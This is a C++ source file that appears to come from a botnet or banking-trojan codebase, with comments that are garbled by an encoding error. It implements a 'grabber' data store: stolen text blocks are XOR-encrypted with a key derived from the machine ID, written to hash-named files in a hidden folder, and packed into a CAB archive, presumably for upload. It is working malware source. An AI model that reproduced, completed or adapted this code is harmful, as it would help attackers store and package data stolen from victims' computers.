//---------------------------------------------------------------------------

#pragma hdrstop

#include "BotCore.h"
#include "Grabbers.h"
#include "StrConsts.h"

//---------------------------------------------------------------------------

// ������ ���������� ������ �������
char GrabberPassword[5] = {0};

const char* GrabbersWorkWolder = "NGWF";
const char* GrabbersFileExt    = ".ngdf";

//-------------------------------------------
//  GetGrabbersPath - ������� ��������� ���
//                �������� �������� �������
//-------------------------------------------
string GetGrabbersPath()
{
	return BOT::MakeFileName(GrabbersWorkWolder, NULL);
}

//-------------------------------------------
//  GetGrabberFileName - ������� ������ ���
//                       ����� �������.
//-------------------------------------------
string GetGrabberFileName(const string& GrabberName)
{
	string Tmp = (!GrabberName.IsEmpty()) ? GrabberName : Random::RandomString2(10, 'A', 'Z');
	DWORD Hash = Tmp.Hash();
	string ShortName;
    ShortName.LongToStr(Hash);
	ShortName += GrabbersFileExt;
	string Name = GetGrabbersPath();
	Name += ShortName;
	return Name;
}


//-------------------------------------------
// ������� ���������� ������ ����������
// ������ �������
//-------------------------------------------
PCHAR MakeGrabberFilePassword()
{
	if (!GrabberPassword[0])
	{
		// ���������� ������
		m_memset(GrabberPassword, 0, sizeof(GrabberPassword));
		PCHAR ID = MakeMachineID();
		DWORD Hash = STRA::Hash(ID);
		STR::Free(ID);
		string Temp;
		WORD NW = LOWORD(Hash) + HIWORD(Hash);
		Temp.Format("%X", NW);
		m_memcpy(GrabberPassword, Temp.t_str(), 4);
    }
	return GrabberPassword;
}





// �������� ��������� ����� �������
#pragma pack(push, 1)
struct TGrabberFileHead
{
	DWORD Signature;  // ��������� �����
	DWORD Version;    // ������ �����
	DWORD Type;       // ��� �����
	DWORD Flags;      // ����� �����
	DWORD FlagsEx;    // �������������� �����
};
#pragma pack(pop)


// �������� ��������� ����� ������ �������
#pragma pack(push, 1)
struct TGrabberBlockHead
{
	DWORD Signature;  // ��������� �����
	DWORD Type;       // ��� ������ �����
	DWORD DataSize;   // ������ ������ �����
};
#pragma pack(pop)




//=============================================================================
//  TGrabberFile - ������� ����� ��� ������ � ������
//                 �������
//=============================================================================
TGrabberFile::TGrabberFile(const string& GrabberName)
{
	// ������ ��� �����
	FBlocks = new TBotCollection();
	FGrabberName = GrabberName;
	FFileName    = GetGrabberFileName(GrabberName);
	FPassword    = MakeGrabberFilePassword();
	FStream = NULL;
}

TGrabberFile::~TGrabberFile()
{
	CloseFile();
	delete FBlocks;
}

//-------------------------------------------
// ������� ��������� ������ ���� � ������
// ������ ��� ������
//-------------------------------------------
bool TGrabberFile::Active()
{
	return FStream != NULL;
}


//-------------------------------------------
// CloseFile - ������� ��������� ��������
//             ����
//-------------------------------------------
void TGrabberFile::CloseFile()
{
	if (FStream)
	{
		delete FStream;
		FStream = NULL;
    }
}

//-------------------------------------------
//  Create - ������� ������ ���� �������
//-------------------------------------------
bool TGrabberFile::Create()
{
	// ��������� �������� ����
	CloseFile();

	// ��������� ����
	TBotFileStream *Stream = new TBotFileStream(FFileName.t_str(), fcmCreate | fcmReadWrite);
	if (!Stream->Valid())
	{
		delete Stream;
		return false;
	}

    // ���� ������� ������
	FStream = Stream;
	if (!UpdateFileHeader(true))
	{
		// � ������ ������ ��������� ���� � ������� ���
		CloseFile();
		pDeleteFileA(FFileName.t_str());
    }

	return FStream != NULL;
}


//-------------------------------------------
// Open - ������� ��������� ����� ���������
//        ���� �������
//-------------------------------------------
bool TGrabberFile::Open()
{
	// ��������� �������� ����
	CloseFile();

	// ��������� ����
	TBotFileStream *Stream = new TBotFileStream(FFileName.t_str(), fcmReadWrite);
	if (!Stream->Valid())
	{
		delete Stream;
		return false;
	}

	FStream = Stream;
	// ���� ������� ������, ����� ���������
	TGrabberFileHead H;
	ClearStruct(H);

	bool Result = FStream->Read(&H, sizeof(H)) == sizeof(H);
	if (Result)
	{
		// ��������� ���������
		Result = H.Signature == GRABBER_FILE_SIGNATURE;

		// ��������� ������
		if (Result)
			Result == H.Version <= GRABBER_FILE_VERSION;

		FType = H.Type;

		// ������ ��� �������
		if (Result)
			Result = ReadSizedString(FGrabberName);

		// ���������� ������� ������ ������ ������
        FBlocksStart = FStream->Position();
	}

	if (!Result)
		CloseFile();

	return Result;
}

//-------------------------------------------
// UpdateFileHeader - ������� ���������
// ��������� ����� �������
//-------------------------------------------
bool TGrabberFile::UpdateFileHeader(bool WriteName)
{
	if (!Active()) return false;

	TGrabberFileHead H;
	ClearStruct(H);

	H.Signature = GRABBER_FILE_SIGNATURE;
	H.Version   = GRABBER_FILE_VERSION;
	H.Type      = FType;

    FStream->Seek(0, SO_BEGIN);

	bool Result = FStream->Write(&H, sizeof(H)) == sizeof(H);

	if (Result && WriteName)
		Result = WriteSizedString(FGrabberName);

	return Result;
}


//-------------------------------------------
//  WriteData - ������� ���������� ����
//              ������.
//-------------------------------------------
bool TGrabberFile::WriteData(LPVOID Data, DWORD Size, bool WriteSize)
{
	if (!FStream) return false;
	bool Result = true;
    if (WriteSize)
		Result = FStream->Write(&Size, sizeof(Size)) == sizeof(Size);

	if (Result && Size)
	{
		// �������� ������ �� ��������� ����� � ������� ��
		TMemory M(Size);
		M.Write(Data, Size);

		// ������� ������
		XORCrypt::Crypt(FPassword, (LPBYTE)M.Buf(), Size);
		// ����������
		Result = FStream->Write(M.Buf(), Size) == Size;
	}

	return Result;
}

//-------------------------------------------
//  ������� ���������� ������ � ��������
//-------------------------------------------
bool TGrabberFile::WriteSizedString(const string &Str)
{
	return WriteData(Str.t_str(), Str.Length(), true);
}


//-------------------------------------------
//  ReadData - ������� ������ ���� ������
//  ��������  DataSize � ����� Buf
//-------------------------------------------
bool TGrabberFile::ReadData(LPVOID Buf, DWORD DataSize)
{
	if (!FStream) return false;
	if (!DataSize) return true;

	bool Result = FStream->Read(Buf, DataSize) == DataSize;
	if (Result)
	{
		// �������������� ������
		XORCrypt::Crypt(FPassword, (LPBYTE)Buf, DataSize);
	}
	return Result;
}

//-------------------------------------------
//  ������� ������ ������ ���������� �������
//-------------------------------------------
bool TGrabberFile::ReadString(DWORD StringSize, string &Str)
{
	if (!FStream) return false;
	Str.SetLength(StringSize);
	bool Result = ReadData(Str.t_str(), StringSize);
	if (!Result) Str.Clear();
	return Result;
}

//-------------------------------------------
//  ������� ������ ������ ����� �������
//  ������� � ������
//-------------------------------------------
bool TGrabberFile::ReadSizedString(string &Str)
{
	if (!FStream) return false;
	DWORD Size;
	bool Result = FStream->Read(&Size, sizeof(Size)) == sizeof(Size);
	if (Result)
		Result = ReadString(Size, Str);
	return Result;
}


//-------------------------------------------
// ������� ��������� ��������� ������
//-------------------------------------------
bool TGrabberFile::AddText(const string& Name, const string& Data)
{
	if (!Active() || Name.IsEmpty() || Data.IsEmpty())
		return false;
	TGrabberBlock B(this);
	return B.WriteText(Name, Data);
}

//-------------------------------------------
//  ������� �������� ����� ������
//-------------------------------------------
bool TGrabberFile::ReadBlocks()
{
	if (!Active()) return false;
	FBlocks->Clear();

	// ��������� � ������ ������� �����
	FStream->Seek(FBlocksStart, SO_BEGIN);

	while (true)
	{
		TGrabberBlock* Block = new TGrabberBlock(this);

		// ������ ������
		if (!Block->Read())
		{
			// ������ ������ �����.
			delete Block;
			break;
		}

		if (!Block->FIgnoreBlock)
			Block->SetOwner(FBlocks);
		else
			delete Block;
    }

	return FBlocks->Count() > 0;
}

//-------------------------------------------
//  ������� ����������� ��������� �����
//-------------------------------------------
string TGrabberFile::DoPackTextData()
{
	string Result;
	int Count = FBlocks->Count();
	if (Count > 0)
	{
		TBotStrings S;
        S.ValueDelimeter = ": ";
		for (int i = 0; i < Count; i++)
		{
			TGrabberBlock* Block = (TGrabberBlock*)FBlocks->Items(i);;
			if (Block->FDataType != GRABBER_DATA_TEXT)
				continue;
            S.AddValue(Block->FName, Block->FAsString);
		}
		if (S.Count() > 0)
			Result = S.GetText();
    }

	return Result;
}


//-------------------------------------------
// PackToCAB - ������� ������������ ������
//             � ��� �����.
// � ������ ������ ������� ���������� ���
// ���� � ��� �������
//-------------------------------------------
string TGrabberFile::PackToCAB()
{
	string FileName;
	if (ReadBlocks())
	{
		FileName = "c:\\temp\\testGrabber.cab"; //File::GetTempName2A();
		LPVOID Cab = CreateCab(FileName.t_str());
		if (Cab)
		{
			// ������������ ��������� ������
			string TextLog = DoPackTextData();
			if (!TextLog.IsEmpty())
				AddStringToCab(Cab, TextLog, GetStr(StrLogFileTextData));


            // ��������� ���
			CloseCab(Cab);
        }
    }

    return FileName;
}




bool TGrabberFile::Test()
{
	string S1 = "test line";
	string S2;
	DWORD Pos = FStream->Position();
	WriteSizedString(S1);
	FStream->SetPosition(Pos);
	ReadSizedString(S2);

	return S1 == S2;
}



//=============================================================================
//  TGrabberBlock - ���� ������ �������
//=============================================================================
TGrabberBlock::TGrabberBlock(TGrabberFile* File)
	: TBotCollectionItem(NULL)
{
	Initialize();
	FFile = File;
}

TGrabberBlock::~TGrabberBlock()
{
	Clear();
}

//-------------------------------------------
// ������� �������������� ���������� ������
//-------------------------------------------
void TGrabberBlock::Initialize()
{
	FDataSize = 0;
	FDataType = 0;
}


//-------------------------------------------
//  Write - ������� ���������� ������ �����
//          � ����
//-------------------------------------------
bool TGrabberBlock::Write(LPVOID Data, DWORD DataSize)
{
	if (!FFile || !FFile->Active())
		return false;

	// ��������� � ����� �����
	FFile->FStream->Seek(0, SO_END);

	// ���������� ��������� �����
	TGrabberBlockHead H;
	H.Signature = GRABBER_FILE_BLOCK_SIGNATURE;
	H.Type      = FDataType;
	H.DataSize  = DataSize;

	// ����� ���������
	bool Result = FFile->FStream->Write(&H, sizeof(H)) == sizeof(H);

	// ���������� ��� �����
	if (Result)
		Result = FFile->WriteSizedString(FName);


	// ����� ������
	if (Result)
		Result = FFile->WriteData(Data, DataSize, false);

	return Result;
}


//-------------------------------------------
// Read - ������� ������ ������ �����
//-------------------------------------------
bool TGrabberBlock::Read()
{
	if (!FFile || !FFile->Active())
		return false;

	Clear();

	// ������ ��������� �����
	TGrabberBlockHead H;
	ClearStruct(H);

	// ������ ���������
	bool Result = FFile->FStream->Read(&H, sizeof(H)) == sizeof(H);

    // ��������� ��������� �����
	if (Result)
		Result = H.Signature == GRABBER_FILE_BLOCK_SIGNATURE;

	// ������ ��� �����
	if (Result)
		Result = FFile->ReadSizedString(FName);

	if (Result)
	{
		FDataType = H.Type;
		FDataSize = H.DataSize;

		Result = ReadBlockData();
    }


	return Result;
}

//-------------------------------------------
// ������� ������ ������ �����
//-------------------------------------------
bool TGrabberBlock::ReadBlockData()
{
	if (!FDataSize) return true;

	switch (FDataType)
	{
		// ������ ��������� ����
		case GRABBER_DATA_TEXT: return FFile->ReadString(FDataSize, FAsString);
	}

	// ��� ������������������� �����������, ������ ��� ������� �������� ������
	// ��� ��������� �������������� ��������� ���� � �����
	FAsBlob = (LPBYTE)MemAlloc(FDataSize + 1);
	*(FAsBlob + FDataSize) = 0;
	return FFile->ReadData(FAsBlob, FDataSize);
}



//-------------------------------------------
//  Clear - ������� ������� ������ �����
//-------------------------------------------
void TGrabberBlock::Clear()
{
	FName.Clear();
	FFileName.Clear();
	FInternalFileName.Clear();
	FAsString.Clear();
	FDataSize = 0;
	FDataType = 0;
	FIgnoreBlock = false;
}

//-------------------------------------------
//  WriteText - ������� ���������� � ����
//              ��������� ����
//-------------------------------------------
bool TGrabberBlock::WriteText(const string& Name, const string& Data)
{
	Clear();
	FName     = Name;
	FDataType = GRABBER_DATA_TEXT;
	return Write(Data.t_str(), Data.Length());
}
